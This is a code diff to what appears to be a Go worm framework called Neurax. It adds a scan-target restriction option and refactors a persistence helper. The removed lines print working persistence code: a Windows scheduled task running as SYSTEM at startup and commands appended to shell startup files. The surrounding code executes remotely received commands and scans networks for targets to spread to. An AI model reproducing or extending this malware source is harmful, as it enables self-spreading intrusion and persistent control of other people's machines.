@@ -93,6 +93,7 @@ type __NeuraxConfig struct {
 	ScanThreads              int
 	ScanFullRange            bool
 	ScanGatewayFirst         bool
+	ScanOnly                 []string
 	Base64                   bool
 	ScanRequiredPort         int
 	Verbose                  bool
@@ -138,6 +139,7 @@ var NeuraxConfig = __NeuraxConfig{
 	ScanThreads:              10,
 	ScanFullRange:            false,
 	ScanGatewayFirst:         false,
+	ScanOnly:                 []string{},
 	Base64:                   false,
 	Verbose:                  false,
 	Remove:                   false,
@@ -355,14 +357,6 @@ func NeuraxSignal(addr string) {
 	}
 }*/
 
-func add_persistent_command(cmd string) {
-	if runtime.GOOS == "windows" {
-		CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
-	} else {
-		CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
-	}
-}
-
 func handle_command(cmd string) {
 	if NeuraxConfig.PreventReexec {
 		if Contains(ReceivedCommands, cmd) {
@@ -392,7 +386,7 @@ func handle_command(cmd string) {
 			time.Sleep(time.Duration(RandomInt(1, 5)))
 		}
 		if strings.Contains(preamble, "p") {
-			add_persistent_command(cmd)
+			AddPersistentCommand(cmd)
 		}
 		if strings.Contains(preamble, "x") && can_execute {
 			out, err := CmdOut(cmd)
@@ -538,6 +532,9 @@ func neurax_scan_active(c chan string) {
 	targets = RemoveFromSlice(targets, GetLocalIp())
 	if len(NeuraxConfig.ScanFirst) != 0 {
 		targets = append(NeuraxConfig.ScanFirst, targets...)
+	}
+	if len(NeuraxConfig.ScanOnly) != 0 {
+		targets = NeuraxConfig.ScanOnly
 	}
 	for _, target := range targets {
 		fmt.Println("Scanning ", target)
